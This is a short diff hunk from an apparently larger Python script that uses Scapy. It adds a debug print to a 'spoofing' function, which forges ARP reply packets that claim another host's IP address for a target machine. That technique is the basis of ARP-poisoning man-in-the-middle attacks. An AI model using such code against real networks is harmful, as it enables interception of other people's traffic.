@@ -439,6 +439,7 @@ def getm(ip):
     return anss[0][1].hwsrc
 def spoofing(ipt, ips):
     mact = getm(ipt)
+    print(mact)
     spacket = sc.ARP(op=2,pdst=ipt,psrc=ips,hwdst=mact)
     sc.send(spacket,count=2,verbose=False)
 
